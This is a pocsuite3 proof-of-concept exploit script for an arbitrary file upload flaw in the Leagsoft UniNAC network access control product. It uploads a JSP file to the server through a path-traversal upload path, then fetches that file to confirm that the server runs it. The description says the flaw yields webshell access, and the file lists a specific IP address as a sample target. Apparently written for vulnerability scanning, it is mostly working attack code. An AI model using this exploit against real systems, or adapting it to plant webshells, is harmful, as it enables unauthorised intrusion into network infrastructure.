#!/usr/bin/env python
# coding: utf-8

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict


class TestPOC(POCBase):
    vulID = 'DSO-02484'
    cweID = "CWE-434"
    appDevLanguage = "unknown"
    appCategory = "物联网设备"
    cveID = ''
    cnvdID = ''
    cnnvdID = ''
    version = '1.0'
    author = ''
    vulDate = '2020-09-25'
    createDate = '2020-10-09'
    updateDate = '2020-10-13'
    name = '联软UniNAC网络准入控制系统 任意文件上传漏洞'
    desc = '联软UniNAC网络准入控制系统 /uai/download/uploadfileToPath.htm 任意文件上传漏洞，攻击者可利用漏洞上传恶意文件从而获取webshell权限。'
    solution = '升级系统至最新版本。'
    severity = 'high'
    vulType = 'file-upload'
    taskType = 'app-vul'
    proto = ['http']
    scanFlag = 1
    tag = ['important']
    references = []
    appName = '''联软 UniNAC网络准入控制系统'''
    appVersion = ''
    appPowerLink = ''
    samples = ['http://119.28.122.164:8099']
    install_requires = []

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        target = self.url + "/uai/download/uploadfileToPath.htm"
        Trojan = self.url + "/notifymsg/devreport/xxx.jsp"
        payload = {'input_localfile': ('xxx.jsp', b'<%@ page contentType="text/html; charset=GBK"%><%@page import="java.math.BigInteger"%><%@page import="java.security.MessageDigest"%><%  MessageDigest md5 = null; md5 = MessageDigest.getInstance("MD5"); String s = "123"; String miyao = "abc"; String jiamichuan = s + miyao; md5.update(jiamichuan.getBytes()); String md5String = new BigInteger(1, md5.digest()).toString(16); out.println(md5String);%>'),
                   "uploadpath": (None, "../webapps/notifymsg/devreport/")
                   }
        resp = requests.post(target, files=payload, verify=False, timeout=30, allow_redirects=False)
        veri_resp = requests.get(Trojan, verify=False, timeout=30, allow_redirects=False)

        if veri_resp.status_code == 200 and 'a906449d5769fa7361d7ecc6aa3f6d28' in veri_resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_verify(result)

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(TestPOC)
